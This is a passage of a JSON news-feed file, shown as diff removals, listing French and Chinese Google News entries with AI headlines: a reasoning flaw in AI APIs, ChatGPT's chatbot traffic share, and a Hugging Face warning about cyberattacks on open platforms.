-    "url": "https://news.google.com/rss/articles/CBMiswFBVV95cUxOTXBuWmJoSzhkcklIaU1VaElTLVlrTWFrVWUyMHJmWE5qTmhvd1VtOVlGRUlOcm90ZVhiQWVnRWxJM21iQzFHcmVhZUpyTHdqVGpESmdCaU9tS1BrVlB5SThuYmpVVjVSb3Fpc1g1SndFc05Jbnd1LVhEMVpmN1QwZFhJMmR3bFRWWG5NVmRwSmtmSHF4MG9VY3ZHTUdSc0Q4TVkzNV9VOEhmQUU4VW1vYXFtSQ?oc=5",
-    "source": "Dataconomy",
-    "via": "Google News (Français)",
-    "lang": "fr",
-    "published": "2026-11-10T10:05:18Z",
-    "seen": "2026-11-10T15:35:43Z",
-    "summary": ""
-  },
-  {
-    "id": "1ce65fdb1dcd",
-    "title": "Des chercheurs révèlent une faille de raisonnement chiffré dans d’importantes API d’IA",
-    "url": "https://news.google.com/rss/articles/CBMivwFBVV95cUxQUVRNV2JZYVRwcmxFOGlmX2hRbnE3YWtONkRmQjFuV2FOR2RkYjFaS2NnQ1BZeU5lTHRlSXJITzdGbU1aUWJWSDRnVGUySW9xSUFlM0dhRWNfSU03YlBWbXNzNVVveE1hVllPd1o5VF9ONHY1SHdvcmdib2FJUlhjU0poYnZmaFJqOFVocTBMYWllSW5aeDlESWs5Z0tUM0NZZnhJN0hxNElDUGtKR2FGdnNRT1BzSzFVQTNZMlphWQ?oc=5",
-    "source": "Dataconomy",
-    "via": "Google News (Français)",
-    "lang": "fr",
-    "published": "2026-11-10T10:05:18Z",
-    "seen": "2026-11-10T15:35:43Z",
-    "summary": ""
-  },
-  {
-    "id": "344b7bb29773",
-    "title": "ChatGPT reprend sa croissance et capte 81 % du trafic des chatbots IA",
-    "url": "https://news.google.com/rss/articles/CBMiqAFBVV95cUxNeWFkRXUwUFZGQkJIWFAxMTByRlBfdnJzblpHNWtiTkVpbUFRQ1hYa0pfOEtITDFoVUJ0N1U4N3UyWDkxZFlBZHBjdTBWRVoxdXVaZkFiUDRYaDJ0bTBTUHozYjZKVXIwNTNKWlVTQ05qQXRuOU1FNXZ5R2tNUkNQYTQ2RzNzeF9SRXAxNUZ0LXBtV28wbW10ZV81SWxuY2tKbXNVNl9zWnE?oc=5",
-    "source": "Dataconomy",
-    "via": "Google News (Français)",
-    "lang": "fr",
-    "published": "2026-11-10T10:05:18Z",
-    "seen": "2026-11-10T15:35:43Z",
-    "summary": ""
-  },
-  {
-    "id": "35a2666929d6",
-    "title": "Hugging Face高管警告：网络攻击可能迫使开放AI平台收紧访问权限",
-    "url": "https://news.google.com/rss/articles/CBMioAFBVV95cUxQcmxZekZGelg4eGlfa0xYTkZpc3ZDeHo3Tk51S1loNzhPcWx5Nk5vUXdDcDdqYnY3SHBYbVNvOTZFWTB5RzhGNDd3SXpJdTZQemRVYTZOQlpPZ29WRmJkMFZ3b0s2Yno5T0tSY0V1WGJTeGhObTZCbDcyWkVFTlBQS1VEa1MtNmFWZUctOWhpckFSeEgyTVZsVHpTNTNzbnBr?oc=5",
-    "source": "Mezha.net",
-    "via": "Google News (中文)",
-    "lang": "zh",
-    "published": "2026-11-10T07:10:00Z",
     "seen": "2026-11-10T15:35:43Z",
     "summary": ""
   }
